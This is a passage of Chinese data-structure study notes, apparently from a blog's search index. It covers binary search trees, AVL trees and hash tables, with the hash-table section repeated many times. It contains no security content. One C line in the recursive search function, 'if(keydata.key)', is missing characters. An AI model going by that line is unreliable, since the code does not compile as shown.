生成一个无序序列可通过构造二叉排序树而变成一个有序序列。构造树的过程就是对无序序列进行排序的过程。 插入的结点均为叶子结点，故无需移动其他节点。相当于在有序序列插入记录而无需移动其他记录。 关键字输入顺序不同，建立的不同二叉排序树。 删除要保证删除后所得的二叉树仍满足二叉排序树的性质不变。 将因删除结点而断开的二叉链表重新连接起来 防止重新链接后树的高度增加 （1）被删除的结点是叶子结点：直接删去该结点。 （2）被删除的结点只有左子树或者只有右子树，用其左子树或者右子树替换它 (结点替换)。 其双亲结点的相应指针域的值改为“指向被删除结点的左子树或右子树”。 （3）被删除的结点既有左子树，也有右子树。 以其中序前趋值替换之（值替换），然后再删除该前趋结点。前趋时左子树中最大的结点。 也可以用其后继替换之，然后再删除该后继节点。后继是右子树中最小的结点。 平衡二叉树Balanced Binary Tree，又称AVL树 一棵平衡二叉树或者是空树，或者是具有下列性质的二叉排序树： 左子树与右子树的高度之差的绝对值小于等于1； 左子树和右子树也是平衡二叉树。 为计算方便，给每个结点附加一个数字，给出该结点左子树与右子树的高度差。这个数字称为结点的平衡因子（BF）。 平衡因子=结点左子树的高度-结点右子树的高度 对于一棵有n个结点的AVL树，其高度保持在O(log2 n)数量级，ASL保持在O(log2 n)量级 分析与调整如果在一棵AVL树中插入一个新结点后造成失衡，则必须重新调整树的结构，使之恢复平衡。 平衡调整的四种类型： A：失衡结点 不止一个失衡结点时，为最小失衡子树的根结点 B：A结点的孩子，C结点的双亲 C：插入新结点的子树 调整原则： ①降低高度 ②保持二叉排序树性质 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#平衡二叉树"},{"categories":["notice"],"content":"\r树表的查找\r二叉排序树Binary Sort Tree，又称为二叉搜索树、二叉查找树 定义二叉排序树或是空树，或是满足如下性质的二叉树： (1)若其左子树非空，则左子树上所有结点的值均小于根结点的值 (2)若其右子树非空，则右子树上所有结点的值均大于等于根结点的值 (3)其左右子树本身又各是一棵二叉排序树 性质中序遍历非空的二叉排序树所得到的数据元素序列是一个按关键字排列的递增有序序列。 存储结构 typedef struct{ KeyType key; //关键字项 InfoType otherinfo; //其他数据域 }ElemType; typedef struct BSTNode{ ElemType data; //数据域 struct BSTNode *Lchild,*rchild; //左右孩子指针 }BSTNode,*BSTree 算法实现（递归） BSTree SearchBST(BSTree T,KeyType key){ if((!T)||key==T-\u003edata.key) return T; else if(keydata.key) return SearchBST(T-\u003eLchild,key); else return SearchBST(T-\u003erchild,key); }//SearchBST 性能分析二又排序树上查找某关键字等于给定值的结点过程，其实就是走了一条从根到该结点的路径。 比较的关键字次数=此节点所在层数 最多的比较次数=树的深度 平均查找长度 含有n个结点的二叉排序树的平均查找长度和树的形态有关 最好情况： 初始序列{45,24,53,12,37,93)，ASL=log2 (n + 1) - 1；树的深度为:⌊log2 n⌋+ 1；与折半查找中的判定树相同。(形态比较均): O (log2 n)1 最坏情况： 初始序列{12,24,37,45,53,93}插入的n个元素从一开始就有序，——变成单支树的形态！此时树的深度为n，ASL=(n+ 1)/2查找效率与顺序查找情况相同：O(n) 操作\r插入插入的元素一定在叶节点上 生成一个无序序列可通过构造二叉排序树而变成一个有序序列。构造树的过程就是对无序序列进行排序的过程。 插入的结点均为叶子结点，故无需移动其他节点。相当于在有序序列插入记录而无需移动其他记录。 关键字输入顺序不同，建立的不同二叉排序树。 删除要保证删除后所得的二叉树仍满足二叉排序树的性质不变。 将因删除结点而断开的二叉链表重新连接起来 防止重新链接后树的高度增加 （1）被删除的结点是叶子结点：直接删去该结点。 （2）被删除的结点只有左子树或者只有右子树，用其左子树或者右子树替换它 (结点替换)。 其双亲结点的相应指针域的值改为“指向被删除结点的左子树或右子树”。 （3）被删除的结点既有左子树，也有右子树。 以其中序前趋值替换之（值替换），然后再删除该前趋结点。前趋时左子树中最大的结点。 也可以用其后继替换之，然后再删除该后继节点。后继是右子树中最小的结点。 平衡二叉树Balanced Binary Tree，又称AVL树 一棵平衡二叉树或者是空树，或者是具有下列性质的二叉排序树： 左子树与右子树的高度之差的绝对值小于等于1； 左子树和右子树也是平衡二叉树。 为计算方便，给每个结点附加一个数字，给出该结点左子树与右子树的高度差。这个数字称为结点的平衡因子（BF）。 平衡因子=结点左子树的高度-结点右子树的高度 对于一棵有n个结点的AVL树，其高度保持在O(log2 n)数量级，ASL保持在O(log2 n)量级 分析与调整如果在一棵AVL树中插入一个新结点后造成失衡，则必须重新调整树的结构，使之恢复平衡。 平衡调整的四种类型： A：失衡结点 不止一个失衡结点时，为最小失衡子树的根结点 B：A结点的孩子，C结点的双亲 C：插入新结点的子树 调整原则： ①降低高度 ②保持二叉排序树性质 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#分析与调整"},{"categories":["notice"],"content":"\r散列表的查找\r基本概念**基本思想：**记录的储存位置与关键字之间存在对应关系 对应关系——hash函数 **如何查找：**根据散列函数H(key)=k，查找key=9，则访问H(9)=9号地址，若内容为9则成功；若查不到，则返回一个特殊值，如空指针或空记录。 **优点：**查找效率高 **缺点：**空间效率低 **散列方法（杂凑法）：**选取某个函数，依该函数按关键字计算元素的存储位置，并按此存放；查找时，由同一个函数对给定值k计算地址，将k与地址单元中元素关键码进行比，确定查找是否成功。 **散列函数（杂凑函数）：**散列方法中使用的转换函数。 **散列表（杂凑表）：**按上述思想构造的表。 **散列函数：**H(key)=k **散列存储：**选取某个函数，依该函数按关键字计算元素的存储位置Loc(i)=H(keyi) **冲突：**不同的关键码映射到同一个散列地址key1≠key2，但是H(key1)=H(key2)，在散列查找方法中，冲突是不可避免的，只能尽可能减少。 **同义词：**具有相同函数 值的多个关键字。 散列函数的构造\r考虑的因素①执行速度(计算散列函数所需时间) ②关键字的长度 ③散列表的大小 ④关键字的分布情况 ⑤查找频率 两个要求①地址空间尽量小 ②存储分布尽量均匀，避免冲突 构造方法直接定址法 数字分析法 平方取中法 折叠法 除留余数法 随机数法 直接定址法Hash(key) = a·key + b (a、b为常数) **优点：**以关键码key的某个线性函数值为散列地址，不会产生冲突。 **缺点：**要占用连续地址空，空间效率低。 除留余数法Hash(key)=key mod p (p是一个整数) 设表长为m，取p\u003c=m且为质数 处理冲突的方法\r1.开放定址法(开地址法)**基本思想：**有冲突时就去寻找下一个空的哈希地址，只要哈希表足够大，空的哈希地址总能找到，并将数据元素存入。 常用方法： 线性探测法 其中：m为散列表长度 di为增量序列1，2，…m-1，且di=i **例：**关键码集为{47，7，29，11，16，92，22，8，3}，散列表表长为m=11，散列函数为Hash(key)=key mod 11；拟用线性探测法处理冲突。建散列表如下： 平均查找长度ASL=(1+2+1+1+1+4+1+2+2)/9=1.67 举一个查找失败的例子（线性探测）： 假设我们给出的哈希函数是H（key） = (key*3)%7 对于一个数去%7，算出来的值不会超过7，故而查找时计算出的哈希地址只可能是0、1、2、3、4、5、6 假设我们要查找一个关键字m,计算出的哈希地址为0， 1.先去探测哈希地址0，发现不是， 2.去探测哈希地址1，发现不是 2.去探测哈希地址2，发现是空位置 发现是空的，说明查找失败了 因此计算出的哈希地址为0的关键字，在该哈希表中查找失败的长度为3 同理，计算出的哈希地址为1的关键字，在该哈希表中查找失败的长度为2 计算出的哈希地址为2的关键字，在该哈希表中查找失败的长度为1 计算出的哈希地址为3的关键字，在该哈希表中查找失败的长度为2 … 根据上述的推导过程，我们就可以得出查找失败的所有情况。 故而，查找失败的情况只取决于哈希函数和空位置。 而对于一个需要查找的关键字，在还不知道具体数值的情况下，我们认为它计算出来的哈希地址落在每一个地址（0~6）的概率都相同，即1/7 根据数学期望的知识，可知查找失败的平均查找长度为： ASL = 3*（1/7）+ 2*（1/7）+1*（1/7）+2*（1/7）+1*（1/7）+5*（1/7）+4*（1/7）=18/7 二次探测法 伪随机探测法 2.链地址法(拉链法)**基本思想：**相同散列地址的记录链成一单链表。m个散列地址就设m个单链表，然后用一个数组将m个单链表的表头指针存储起来，形成一个动态的结构。 例如：一组关键字为{19,14,23,1,68,20,84,27,55,11,10,79}，散列函数为Hash(key)=key mod 13 链地址法优点： 非同义词不会冲突 链表上结点空间动态申请，更适合于表长不确定的情况 给定值查找值k，查找过程： 查找效率分析使用平均查找长度ASL来衡量查找算法，ASL取决于： 散列函数 处理冲突的方法 散列表的填装因子α α=表中填入的记录数/哈希表的长度 α越大，表中记录数越多，说明表装得越满，发生冲突的可能性就越大，查找时比较次数就越多。 ASL与填装因子α有关，既不是严格的O(1)，也不是O(n) 结论 散列表基数与有很好的平均性能，优于一些传统的技术 链地址法优于开地址法 除留余数法作散列函数优于其他类型函数 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#散列表的查找"},{"categories":["notice"],"content":"\r散列表的查找\r基本概念**基本思想：**记录的储存位置与关键字之间存在对应关系 对应关系——hash函数 **如何查找：**根据散列函数H(key)=k，查找key=9，则访问H(9)=9号地址，若内容为9则成功；若查不到，则返回一个特殊值，如空指针或空记录。 **优点：**查找效率高 **缺点：**空间效率低 **散列方法（杂凑法）：**选取某个函数，依该函数按关键字计算元素的存储位置，并按此存放；查找时，由同一个函数对给定值k计算地址，将k与地址单元中元素关键码进行比，确定查找是否成功。 **散列函数（杂凑函数）：**散列方法中使用的转换函数。 **散列表（杂凑表）：**按上述思想构造的表。 **散列函数：**H(key)=k **散列存储：**选取某个函数，依该函数按关键字计算元素的存储位置Loc(i)=H(keyi) **冲突：**不同的关键码映射到同一个散列地址key1≠key2，但是H(key1)=H(key2)，在散列查找方法中，冲突是不可避免的，只能尽可能减少。 **同义词：**具有相同函数 值的多个关键字。 散列函数的构造\r考虑的因素①执行速度(计算散列函数所需时间) ②关键字的长度 ③散列表的大小 ④关键字的分布情况 ⑤查找频率 两个要求①地址空间尽量小 ②存储分布尽量均匀，避免冲突 构造方法直接定址法 数字分析法 平方取中法 折叠法 除留余数法 随机数法 直接定址法Hash(key) = a·key + b (a、b为常数) **优点：**以关键码key的某个线性函数值为散列地址，不会产生冲突。 **缺点：**要占用连续地址空，空间效率低。 除留余数法Hash(key)=key mod p (p是一个整数) 设表长为m，取p\u003c=m且为质数 处理冲突的方法\r1.开放定址法(开地址法)**基本思想：**有冲突时就去寻找下一个空的哈希地址，只要哈希表足够大，空的哈希地址总能找到，并将数据元素存入。 常用方法： 线性探测法 其中：m为散列表长度 di为增量序列1，2，…m-1，且di=i **例：**关键码集为{47，7，29，11，16，92，22，8，3}，散列表表长为m=11，散列函数为Hash(key)=key mod 11；拟用线性探测法处理冲突。建散列表如下： 平均查找长度ASL=(1+2+1+1+1+4+1+2+2)/9=1.67 举一个查找失败的例子（线性探测）： 假设我们给出的哈希函数是H（key） = (key*3)%7 对于一个数去%7，算出来的值不会超过7，故而查找时计算出的哈希地址只可能是0、1、2、3、4、5、6 假设我们要查找一个关键字m,计算出的哈希地址为0， 1.先去探测哈希地址0，发现不是， 2.去探测哈希地址1，发现不是 2.去探测哈希地址2，发现是空位置 发现是空的，说明查找失败了 因此计算出的哈希地址为0的关键字，在该哈希表中查找失败的长度为3 同理，计算出的哈希地址为1的关键字，在该哈希表中查找失败的长度为2 计算出的哈希地址为2的关键字，在该哈希表中查找失败的长度为1 计算出的哈希地址为3的关键字，在该哈希表中查找失败的长度为2 … 根据上述的推导过程，我们就可以得出查找失败的所有情况。 故而，查找失败的情况只取决于哈希函数和空位置。 而对于一个需要查找的关键字，在还不知道具体数值的情况下，我们认为它计算出来的哈希地址落在每一个地址（0~6）的概率都相同，即1/7 根据数学期望的知识，可知查找失败的平均查找长度为： ASL = 3*（1/7）+ 2*（1/7）+1*（1/7）+2*（1/7）+1*（1/7）+5*（1/7）+4*（1/7）=18/7 二次探测法 伪随机探测法 2.链地址法(拉链法)**基本思想：**相同散列地址的记录链成一单链表。m个散列地址就设m个单链表，然后用一个数组将m个单链表的表头指针存储起来，形成一个动态的结构。 例如：一组关键字为{19,14,23,1,68,20,84,27,55,11,10,79}，散列函数为Hash(key)=key mod 13 链地址法优点： 非同义词不会冲突 链表上结点空间动态申请，更适合于表长不确定的情况 给定值查找值k，查找过程： 查找效率分析使用平均查找长度ASL来衡量查找算法，ASL取决于： 散列函数 处理冲突的方法 散列表的填装因子α α=表中填入的记录数/哈希表的长度 α越大，表中记录数越多，说明表装得越满，发生冲突的可能性就越大，查找时比较次数就越多。 ASL与填装因子α有关，既不是严格的O(1)，也不是O(n) 结论 散列表基数与有很好的平均性能，优于一些传统的技术 链地址法优于开地址法 除留余数法作散列函数优于其他类型函数 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#基本概念"},{"categories":["notice"],"content":"\r散列表的查找\r基本概念**基本思想：**记录的储存位置与关键字之间存在对应关系 对应关系——hash函数 **如何查找：**根据散列函数H(key)=k，查找key=9，则访问H(9)=9号地址，若内容为9则成功；若查不到，则返回一个特殊值，如空指针或空记录。 **优点：**查找效率高 **缺点：**空间效率低 **散列方法（杂凑法）：**选取某个函数，依该函数按关键字计算元素的存储位置，并按此存放；查找时，由同一个函数对给定值k计算地址，将k与地址单元中元素关键码进行比，确定查找是否成功。 **散列函数（杂凑函数）：**散列方法中使用的转换函数。 **散列表（杂凑表）：**按上述思想构造的表。 **散列函数：**H(key)=k **散列存储：**选取某个函数，依该函数按关键字计算元素的存储位置Loc(i)=H(keyi) **冲突：**不同的关键码映射到同一个散列地址key1≠key2，但是H(key1)=H(key2)，在散列查找方法中，冲突是不可避免的，只能尽可能减少。 **同义词：**具有相同函数 值的多个关键字。 散列函数的构造\r考虑的因素①执行速度(计算散列函数所需时间) ②关键字的长度 ③散列表的大小 ④关键字的分布情况 ⑤查找频率 两个要求①地址空间尽量小 ②存储分布尽量均匀，避免冲突 构造方法直接定址法 数字分析法 平方取中法 折叠法 除留余数法 随机数法 直接定址法Hash(key) = a·key + b (a、b为常数) **优点：**以关键码key的某个线性函数值为散列地址，不会产生冲突。 **缺点：**要占用连续地址空，空间效率低。 除留余数法Hash(key)=key mod p (p是一个整数) 设表长为m，取p\u003c=m且为质数 处理冲突的方法\r1.开放定址法(开地址法)**基本思想：**有冲突时就去寻找下一个空的哈希地址，只要哈希表足够大，空的哈希地址总能找到，并将数据元素存入。 常用方法： 线性探测法 其中：m为散列表长度 di为增量序列1，2，…m-1，且di=i **例：**关键码集为{47，7，29，11，16，92，22，8，3}，散列表表长为m=11，散列函数为Hash(key)=key mod 11；拟用线性探测法处理冲突。建散列表如下： 平均查找长度ASL=(1+2+1+1+1+4+1+2+2)/9=1.67 举一个查找失败的例子（线性探测）： 假设我们给出的哈希函数是H（key） = (key*3)%7 对于一个数去%7，算出来的值不会超过7，故而查找时计算出的哈希地址只可能是0、1、2、3、4、5、6 假设我们要查找一个关键字m,计算出的哈希地址为0， 1.先去探测哈希地址0，发现不是， 2.去探测哈希地址1，发现不是 2.去探测哈希地址2，发现是空位置 发现是空的，说明查找失败了 因此计算出的哈希地址为0的关键字，在该哈希表中查找失败的长度为3 同理，计算出的哈希地址为1的关键字，在该哈希表中查找失败的长度为2 计算出的哈希地址为2的关键字，在该哈希表中查找失败的长度为1 计算出的哈希地址为3的关键字，在该哈希表中查找失败的长度为2 … 根据上述的推导过程，我们就可以得出查找失败的所有情况。 故而，查找失败的情况只取决于哈希函数和空位置。 而对于一个需要查找的关键字，在还不知道具体数值的情况下，我们认为它计算出来的哈希地址落在每一个地址（0~6）的概率都相同，即1/7 根据数学期望的知识，可知查找失败的平均查找长度为： ASL = 3*（1/7）+ 2*（1/7）+1*（1/7）+2*（1/7）+1*（1/7）+5*（1/7）+4*（1/7）=18/7 二次探测法 伪随机探测法 2.链地址法(拉链法)**基本思想：**相同散列地址的记录链成一单链表。m个散列地址就设m个单链表，然后用一个数组将m个单链表的表头指针存储起来，形成一个动态的结构。 例如：一组关键字为{19,14,23,1,68,20,84,27,55,11,10,79}，散列函数为Hash(key)=key mod 13 链地址法优点： 非同义词不会冲突 链表上结点空间动态申请，更适合于表长不确定的情况 给定值查找值k，查找过程： 查找效率分析使用平均查找长度ASL来衡量查找算法，ASL取决于： 散列函数 处理冲突的方法 散列表的填装因子α α=表中填入的记录数/哈希表的长度 α越大，表中记录数越多，说明表装得越满，发生冲突的可能性就越大，查找时比较次数就越多。 ASL与填装因子α有关，既不是严格的O(1)，也不是O(n) 结论 散列表基数与有很好的平均性能，优于一些传统的技术 链地址法优于开地址法 除留余数法作散列函数优于其他类型函数 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#散列函数的构造"},{"categories":["notice"],"content":"\r散列表的查找\r基本概念**基本思想：**记录的储存位置与关键字之间存在对应关系 对应关系——hash函数 **如何查找：**根据散列函数H(key)=k，查找key=9，则访问H(9)=9号地址，若内容为9则成功；若查不到，则返回一个特殊值，如空指针或空记录。 **优点：**查找效率高 **缺点：**空间效率低 **散列方法（杂凑法）：**选取某个函数，依该函数按关键字计算元素的存储位置，并按此存放；查找时，由同一个函数对给定值k计算地址，将k与地址单元中元素关键码进行比，确定查找是否成功。 **散列函数（杂凑函数）：**散列方法中使用的转换函数。 **散列表（杂凑表）：**按上述思想构造的表。 **散列函数：**H(key)=k **散列存储：**选取某个函数，依该函数按关键字计算元素的存储位置Loc(i)=H(keyi) **冲突：**不同的关键码映射到同一个散列地址key1≠key2，但是H(key1)=H(key2)，在散列查找方法中，冲突是不可避免的，只能尽可能减少。 **同义词：**具有相同函数 值的多个关键字。 散列函数的构造\r考虑的因素①执行速度(计算散列函数所需时间) ②关键字的长度 ③散列表的大小 ④关键字的分布情况 ⑤查找频率 两个要求①地址空间尽量小 ②存储分布尽量均匀，避免冲突 构造方法直接定址法 数字分析法 平方取中法 折叠法 除留余数法 随机数法 直接定址法Hash(key) = a·key + b (a、b为常数) **优点：**以关键码key的某个线性函数值为散列地址，不会产生冲突。 **缺点：**要占用连续地址空，空间效率低。 除留余数法Hash(key)=key mod p (p是一个整数) 设表长为m，取p\u003c=m且为质数 处理冲突的方法\r1.开放定址法(开地址法)**基本思想：**有冲突时就去寻找下一个空的哈希地址，只要哈希表足够大，空的哈希地址总能找到，并将数据元素存入。 常用方法： 线性探测法 其中：m为散列表长度 di为增量序列1，2，…m-1，且di=i **例：**关键码集为{47，7，29，11，16，92，22，8，3}，散列表表长为m=11，散列函数为Hash(key)=key mod 11；拟用线性探测法处理冲突。建散列表如下： 平均查找长度ASL=(1+2+1+1+1+4+1+2+2)/9=1.67 举一个查找失败的例子（线性探测）： 假设我们给出的哈希函数是H（key） = (key*3)%7 对于一个数去%7，算出来的值不会超过7，故而查找时计算出的哈希地址只可能是0、1、2、3、4、5、6 假设我们要查找一个关键字m,计算出的哈希地址为0， 1.先去探测哈希地址0，发现不是， 2.去探测哈希地址1，发现不是 2.去探测哈希地址2，发现是空位置 发现是空的，说明查找失败了 因此计算出的哈希地址为0的关键字，在该哈希表中查找失败的长度为3 同理，计算出的哈希地址为1的关键字，在该哈希表中查找失败的长度为2 计算出的哈希地址为2的关键字，在该哈希表中查找失败的长度为1 计算出的哈希地址为3的关键字，在该哈希表中查找失败的长度为2 … 根据上述的推导过程，我们就可以得出查找失败的所有情况。 故而，查找失败的情况只取决于哈希函数和空位置。 而对于一个需要查找的关键字，在还不知道具体数值的情况下，我们认为它计算出来的哈希地址落在每一个地址（0~6）的概率都相同，即1/7 根据数学期望的知识，可知查找失败的平均查找长度为： ASL = 3*（1/7）+ 2*（1/7）+1*（1/7）+2*（1/7）+1*（1/7）+5*（1/7）+4*（1/7）=18/7 二次探测法 伪随机探测法 2.链地址法(拉链法)**基本思想：**相同散列地址的记录链成一单链表。m个散列地址就设m个单链表，然后用一个数组将m个单链表的表头指针存储起来，形成一个动态的结构。 例如：一组关键字为{19,14,23,1,68,20,84,27,55,11,10,79}，散列函数为Hash(key)=key mod 13 链地址法优点： 非同义词不会冲突 链表上结点空间动态申请，更适合于表长不确定的情况 给定值查找值k，查找过程： 查找效率分析使用平均查找长度ASL来衡量查找算法，ASL取决于： 散列函数 处理冲突的方法 散列表的填装因子α α=表中填入的记录数/哈希表的长度 α越大，表中记录数越多，说明表装得越满，发生冲突的可能性就越大，查找时比较次数就越多。 ASL与填装因子α有关，既不是严格的O(1)，也不是O(n) 结论 散列表基数与有很好的平均性能，优于一些传统的技术 链地址法优于开地址法 除留余数法作散列函数优于其他类型函数 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#考虑的因素"},{"categories":["notice"],"content":"\r散列表的查找\r基本概念**基本思想：**记录的储存位置与关键字之间存在对应关系 对应关系——hash函数 **如何查找：**根据散列函数H(key)=k，查找key=9，则访问H(9)=9号地址，若内容为9则成功；若查不到，则返回一个特殊值，如空指针或空记录。 **优点：**查找效率高 **缺点：**空间效率低 **散列方法（杂凑法）：**选取某个函数，依该函数按关键字计算元素的存储位置，并按此存放；查找时，由同一个函数对给定值k计算地址，将k与地址单元中元素关键码进行比，确定查找是否成功。 **散列函数（杂凑函数）：**散列方法中使用的转换函数。 **散列表（杂凑表）：**按上述思想构造的表。 **散列函数：**H(key)=k **散列存储：**选取某个函数，依该函数按关键字计算元素的存储位置Loc(i)=H(keyi) **冲突：**不同的关键码映射到同一个散列地址key1≠key2，但是H(key1)=H(key2)，在散列查找方法中，冲突是不可避免的，只能尽可能减少。 **同义词：**具有相同函数 值的多个关键字。 散列函数的构造\r考虑的因素①执行速度(计算散列函数所需时间) ②关键字的长度 ③散列表的大小 ④关键字的分布情况 ⑤查找频率 两个要求①地址空间尽量小 ②存储分布尽量均匀，避免冲突 构造方法直接定址法 数字分析法 平方取中法 折叠法 除留余数法 随机数法 直接定址法Hash(key) = a·key + b (a、b为常数) **优点：**以关键码key的某个线性函数值为散列地址，不会产生冲突。 **缺点：**要占用连续地址空，空间效率低。 除留余数法Hash(key)=key mod p (p是一个整数) 设表长为m，取p\u003c=m且为质数 处理冲突的方法\r1.开放定址法(开地址法)**基本思想：**有冲突时就去寻找下一个空的哈希地址，只要哈希表足够大，空的哈希地址总能找到，并将数据元素存入。 常用方法： 线性探测法 其中：m为散列表长度 di为增量序列1，2，…m-1，且di=i **例：**关键码集为{47，7，29，11，16，92，22，8，3}，散列表表长为m=11，散列函数为Hash(key)=key mod 11；拟用线性探测法处理冲突。建散列表如下： 平均查找长度ASL=(1+2+1+1+1+4+1+2+2)/9=1.67 举一个查找失败的例子（线性探测）： 假设我们给出的哈希函数是H（key） = (key*3)%7 对于一个数去%7，算出来的值不会超过7，故而查找时计算出的哈希地址只可能是0、1、2、3、4、5、6 假设我们要查找一个关键字m,计算出的哈希地址为0， 1.先去探测哈希地址0，发现不是， 2.去探测哈希地址1，发现不是 2.去探测哈希地址2，发现是空位置 发现是空的，说明查找失败了 因此计算出的哈希地址为0的关键字，在该哈希表中查找失败的长度为3 同理，计算出的哈希地址为1的关键字，在该哈希表中查找失败的长度为2 计算出的哈希地址为2的关键字，在该哈希表中查找失败的长度为1 计算出的哈希地址为3的关键字，在该哈希表中查找失败的长度为2 … 根据上述的推导过程，我们就可以得出查找失败的所有情况。 故而，查找失败的情况只取决于哈希函数和空位置。 而对于一个需要查找的关键字，在还不知道具体数值的情况下，我们认为它计算出来的哈希地址落在每一个地址（0~6）的概率都相同，即1/7 根据数学期望的知识，可知查找失败的平均查找长度为： ASL = 3*（1/7）+ 2*（1/7）+1*（1/7）+2*（1/7）+1*（1/7）+5*（1/7）+4*（1/7）=18/7 二次探测法 伪随机探测法 2.链地址法(拉链法)**基本思想：**相同散列地址的记录链成一单链表。m个散列地址就设m个单链表，然后用一个数组将m个单链表的表头指针存储起来，形成一个动态的结构。 例如：一组关键字为{19,14,23,1,68,20,84,27,55,11,10,79}，散列函数为Hash(key)=key mod 13 链地址法优点： 非同义词不会冲突 链表上结点空间动态申请，更适合于表长不确定的情况 给定值查找值k，查找过程： 查找效率分析使用平均查找长度ASL来衡量查找算法，ASL取决于： 散列函数 处理冲突的方法 散列表的填装因子α α=表中填入的记录数/哈希表的长度 α越大，表中记录数越多，说明表装得越满，发生冲突的可能性就越大，查找时比较次数就越多。 ASL与填装因子α有关，既不是严格的O(1)，也不是O(n) 结论 散列表基数与有很好的平均性能，优于一些传统的技术 链地址法优于开地址法 除留余数法作散列函数优于其他类型函数 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#两个要求"},{"categories":["notice"],"content":"\r散列表的查找\r基本概念**基本思想：**记录的储存位置与关键字之间存在对应关系 对应关系——hash函数 **如何查找：**根据散列函数H(key)=k，查找key=9，则访问H(9)=9号地址，若内容为9则成功；若查不到，则返回一个特殊值，如空指针或空记录。 **优点：**查找效率高 **缺点：**空间效率低 **散列方法（杂凑法）：**选取某个函数，依该函数按关键字计算元素的存储位置，并按此存放；查找时，由同一个函数对给定值k计算地址，将k与地址单元中元素关键码进行比，确定查找是否成功。 **散列函数（杂凑函数）：**散列方法中使用的转换函数。 **散列表（杂凑表）：**按上述思想构造的表。 **散列函数：**H(key)=k **散列存储：**选取某个函数，依该函数按关键字计算元素的存储位置Loc(i)=H(keyi) **冲突：**不同的关键码映射到同一个散列地址key1≠key2，但是H(key1)=H(key2)，在散列查找方法中，冲突是不可避免的，只能尽可能减少。 **同义词：**具有相同函数 值的多个关键字。 散列函数的构造\r考虑的因素①执行速度(计算散列函数所需时间) ②关键字的长度 ③散列表的大小 ④关键字的分布情况 ⑤查找频率 两个要求①地址空间尽量小 ②存储分布尽量均匀，避免冲突 构造方法直接定址法 数字分析法 平方取中法 折叠法 除留余数法 随机数法 直接定址法Hash(key) = a·key + b (a、b为常数) **优点：**以关键码key的某个线性函数值为散列地址，不会产生冲突。 **缺点：**要占用连续地址空，空间效率低。 除留余数法Hash(key)=key mod p (p是一个整数) 设表长为m，取p\u003c=m且为质数 处理冲突的方法\r1.开放定址法(开地址法)**基本思想：**有冲突时就去寻找下一个空的哈希地址，只要哈希表足够大，空的哈希地址总能找到，并将数据元素存入。 常用方法： 线性探测法 其中：m为散列表长度 di为增量序列1，2，…m-1，且di=i **例：**关键码集为{47，7，29，11，16，92，22，8，3}，散列表表长为m=11，散列函数为Hash(key)=key mod 11；拟用线性探测法处理冲突。建散列表如下： 平均查找长度ASL=(1+2+1+1+1+4+1+2+2)/9=1.67 举一个查找失败的例子（线性探测）： 假设我们给出的哈希函数是H（key） = (key*3)%7 对于一个数去%7，算出来的值不会超过7，故而查找时计算出的哈希地址只可能是0、1、2、3、4、5、6 假设我们要查找一个关键字m,计算出的哈希地址为0， 1.先去探测哈希地址0，发现不是， 2.去探测哈希地址1，发现不是 2.去探测哈希地址2，发现是空位置 发现是空的，说明查找失败了 因此计算出的哈希地址为0的关键字，在该哈希表中查找失败的长度为3 同理，计算出的哈希地址为1的关键字，在该哈希表中查找失败的长度为2 计算出的哈希地址为2的关键字，在该哈希表中查找失败的长度为1 计算出的哈希地址为3的关键字，在该哈希表中查找失败的长度为2 … 根据上述的推导过程，我们就可以得出查找失败的所有情况。 故而，查找失败的情况只取决于哈希函数和空位置。 而对于一个需要查找的关键字，在还不知道具体数值的情况下，我们认为它计算出来的哈希地址落在每一个地址（0~6）的概率都相同，即1/7 根据数学期望的知识，可知查找失败的平均查找长度为： ASL = 3*（1/7）+ 2*（1/7）+1*（1/7）+2*（1/7）+1*（1/7）+5*（1/7）+4*（1/7）=18/7 二次探测法 伪随机探测法 2.链地址法(拉链法)**基本思想：**相同散列地址的记录链成一单链表。m个散列地址就设m个单链表，然后用一个数组将m个单链表的表头指针存储起来，形成一个动态的结构。 例如：一组关键字为{19,14,23,1,68,20,84,27,55,11,10,79}，散列函数为Hash(key)=key mod 13 链地址法优点： 非同义词不会冲突 链表上结点空间动态申请，更适合于表长不确定的情况 给定值查找值k，查找过程： 查找效率分析使用平均查找长度ASL来衡量查找算法，ASL取决于： 散列函数 处理冲突的方法 散列表的填装因子α α=表中填入的记录数/哈希表的长度 α越大，表中记录数越多，说明表装得越满，发生冲突的可能性就越大，查找时比较次数就越多。 ASL与填装因子α有关，既不是严格的O(1)，也不是O(n) 结论 散列表基数与有很好的平均性能，优于一些传统的技术 链地址法优于开地址法 除留余数法作散列函数优于其他类型函数 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#构造方法"},{"categories":["notice"],"content":"\r散列表的查找\r基本概念**基本思想：**记录的储存位置与关键字之间存在对应关系 对应关系——hash函数 **如何查找：**根据散列函数H(key)=k，查找key=9，则访问H(9)=9号地址，若内容为9则成功；若查不到，则返回一个特殊值，如空指针或空记录。 **优点：**查找效率高 **缺点：**空间效率低 **散列方法（杂凑法）：**选取某个函数，依该函数按关键字计算元素的存储位置，并按此存放；查找时，由同一个函数对给定值k计算地址，将k与地址单元中元素关键码进行比，确定查找是否成功。 **散列函数（杂凑函数）：**散列方法中使用的转换函数。 **散列表（杂凑表）：**按上述思想构造的表。 **散列函数：**H(key)=k **散列存储：**选取某个函数，依该函数按关键字计算元素的存储位置Loc(i)=H(keyi) **冲突：**不同的关键码映射到同一个散列地址key1≠key2，但是H(key1)=H(key2)，在散列查找方法中，冲突是不可避免的，只能尽可能减少。 **同义词：**具有相同函数 值的多个关键字。 散列函数的构造\r考虑的因素①执行速度(计算散列函数所需时间) ②关键字的长度 ③散列表的大小 ④关键字的分布情况 ⑤查找频率 两个要求①地址空间尽量小 ②存储分布尽量均匀，避免冲突 